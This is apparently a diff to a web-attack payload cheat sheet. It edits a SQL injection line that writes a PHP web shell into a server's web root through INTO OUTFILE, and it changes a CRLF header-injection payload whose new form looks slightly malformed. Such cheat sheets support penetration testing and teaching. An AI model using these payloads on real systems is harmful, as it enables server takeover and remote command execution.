@@ -541,7 +541,7 @@ https://github.com/OWASP/www-community/blob/master/pages/attacks/SQL_Injection_B
  
 ### Webshell via SQLI
   
-' union select 1, 2, 3,"<\?php system($_GET['cmd']);\?>" into outfile"/var/www/html/pdp.php"-- -
+' union select 1, 2, 3,"<\?php system($_GET['cmd']);\?>" into outfile "/var/www/html/pdp.php"-- -
   
 ## NOSQL Injection
   
@@ -611,4 +611,4 @@ https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploi
   
 ## CRLF Injection
   
-/%0d%0aheader
+/%0d%%0aLocation
